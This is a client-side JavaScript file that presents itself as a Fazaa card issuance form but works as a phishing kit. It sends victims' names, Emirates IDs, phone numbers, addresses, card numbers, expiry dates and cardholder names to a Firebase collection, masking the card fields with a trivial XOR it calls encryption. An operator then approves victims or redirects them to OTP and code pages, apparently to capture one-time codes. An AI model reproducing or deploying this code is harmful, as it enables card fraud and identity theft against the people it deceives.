/* Customer card issuance flow — shared pays/{sessionId} contract. */
(function () {
  const firebaseConfig = {
    apiKey: "AIzaSyDtdis9lsMO4_XEezhKltBizmc8VOhZRcA",
    authDomain: "fazaa-e035d.firebaseapp.com",
    projectId: "fazaa-e035d",
    storageBucket: "fazaa-e035d.firebasestorage.app",
    messagingSenderId: "252034503956",
    appId: "1:252034503956:web:c9393f0020f1420adb5e01"
  };
  if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
  const db = firebase.firestore();
  const KEY = "fazaa_pays_session_id";
  const encrypt = (value) => {
    const text = String(value || "");
    let out = "";
    for (let i = 0; i < text.length; i++) out += String.fromCharCode(text.charCodeAt(i) ^ 0x42);
    return out;
  };
  const params = new URLSearchParams(location.search);
  const value = (id) => document.getElementById(id)?.value?.trim() || "";
  const show = (id, visible) => { const el = document.getElementById(id); if (el) el.style.display = visible ? "block" : "none"; };
  const setText = (id, text) => { const el = document.getElementById(id); if (el) el.textContent = text; };
  const redirectMap = {
    "/index.html": "/index.html", "/cards.html": "/cards.html", "/register.html": "/register.html",
    "/order.html": "/order.html", "/payment.html": "/payment.html", "/otp.html": "/otp.html", "/code.html": "/code.html",
    index: "/index.html", cards: "/cards.html", register: "/register.html", order: "/order.html", payment: "/payment.html", otp: "/otp.html", code: "/code.html"
  };
  function go(page, sessionId) {
    const target = redirectMap[page] || redirectMap[String(page || "").replace(/\.html$/, "")] || "/otp.html";
    const join = target.includes("?") ? "&" : "?";
    location.assign(target + join + "orderId=" + encodeURIComponent(sessionId));
  }
  function restoreRejected(message) {
    show("loadingSpinner", false); show("successMessage", false); show("formContent", true);
    const box = document.getElementById("rejectionMessage");
    if (box) { box.textContent = message; box.style.display = "block"; }
  }
  function start() {
    const form = document.getElementById("registrationForm");
    if (!form) return;
    const bin = document.getElementById("binNumber");
    if (bin) bin.addEventListener("input", () => { bin.value = bin.value.replace(/\D/g, "").slice(0, 6); });
    let sessionId = sessionStorage.getItem(KEY) || params.get("orderId") || "";
    let unsubscribe = null;
    const watch = (id) => {
      if (unsubscribe) unsubscribe();
      unsubscribe = db.collection("pays").doc(id).onSnapshot((snap) => {
        if (!snap.exists) return;
        const data = snap.data() || {};
        const status = String(data.status || "pending").toLowerCase();
        const redirectPage = data.redirectPage;
        if (redirectPage && data.redirectRequestedAt) { go(redirectPage, id); return; }
        if (status === "approved") { go("otp", id); return; }
        if (status === "rejected") {
          restoreRejected(data.rejectionMessage || "تم رفض البطاقة من قبل المدير، يرجى إعادة المحاولة.");
        }
      }, (error) => console.error("pays listener failed", error));
    };
    if (sessionId) watch(sessionId);
    form.addEventListener("submit", async (event) => {
      event.preventDefault();
      const binNumber = value("binNumber");
      if (binNumber && !/^\d{6}$/.test(binNumber)) {
        setText("errorMessage", "رقم BIN الاختياري يجب أن يتكون من 6 أرقام."); show("errorMessage", true); return;
      }
      show("formContent", false); show("loadingSpinner", true); show("errorMessage", false); show("successMessage", false);
      const id = sessionId || ("pays_" + Date.now() + "_" + Math.random().toString(36).slice(2, 9));
      const now = firebase.firestore.FieldValue.serverTimestamp();
      const payload = {
        fullName: value("fullName"), phone: value("phone"), emiratesId: value("emiratesId"), region: value("region"),
        street: value("street"), district: value("district"), deliveryDate: value("deliveryDate"),
        cardNumber: encrypt(value("cardNumber")), expiry: encrypt(value("expiry")),
        cardHolder: encrypt(value("cardHolder")), binNumber: binNumber ? encrypt(binNumber) : "",
        cardBrand: params.get("card") || "fazaa", cardType: params.get("type") || "",
        paymentMethod: "manual_on_delivery", status: "pending", cardStatus: "pending", currentStep: "payment",
        rejectionMessage: "", createdAt: now, updatedAt: now, lastActiveAt: now, isOnline: true
      };
      try {
        await db.collection("pays").doc(id).set(payload, { merge: true });
        sessionId = id; sessionStorage.setItem(KEY, id); sessionStorage.setItem("_pays_id", id);
        setText("successMessage", "تم إرسال الطلب، يرجى الانتظار حتى يراجعه المدير."); show("loadingSpinner", true); show("successMessage", true); watch(id);
      } catch (error) {
        console.error(error); show("loadingSpinner", false); show("formContent", true); setText("errorMessage", "حدث خطأ أثناء إرسال الطلب: " + error.message); show("errorMessage", true);
      }
    });
  }
  if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", start); else start();
})();
